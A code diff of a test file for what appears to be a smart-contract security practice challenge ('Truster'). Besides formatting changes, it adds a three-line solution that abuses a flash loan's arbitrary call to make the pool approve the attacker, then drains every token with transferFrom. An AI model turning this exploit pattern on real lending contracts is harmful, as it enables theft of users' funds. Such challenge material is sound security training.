@@ -1,12 +1,12 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
-describe('[Challenge] Truster', function () {
+describe('[Challenge] Truster', function() {
     let deployer, attacker;
 
     const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
 
-    before(async function () {
+    before(async function() {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
         [deployer, attacker] = await ethers.getSigners();
 
@@ -27,11 +27,14 @@ describe('[Challenge] Truster', function () {
         ).to.equal('0');
     });
 
-    it('Exploit', async function () {
+    it('Exploit', async function() {
         /** CODE YOUR EXPLOIT HERE  */
+        const data = this.token.interface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL]);
+        await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, data);
+        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
     });
 
-    after(async function () {
+    after(async function() {
         /** SUCCESS CONDITIONS */
 
         // Attacker has taken all tokens from the pool
